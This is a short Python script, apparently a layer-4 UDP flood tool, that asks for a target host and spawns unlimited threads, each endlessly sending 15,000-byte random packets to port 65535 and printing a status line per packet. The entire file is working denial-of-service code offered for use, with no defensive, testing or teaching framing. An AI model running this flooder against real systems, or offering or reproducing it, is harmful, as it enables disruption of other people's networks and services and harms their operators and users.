import threading
import socket
import random

ip = socket.gethostbyname(input("IP: "))
port = 65535

server_address = (ip, port)


def l4_udp():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            byte_s = random._urandom(15000)
            s.sendto(byte_s, server_address)

            if port == 0:
                print("\033[32m[+]\033[0m L4 UDP Packet sent ->", ip)
            else:
                print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {ip}:{port}")

            s.close()

        except Exception as err:
            print("\033[31m[-]\033[0m", err)


while True:
    t = threading.Thread(target=l4_udp)
    t.start()
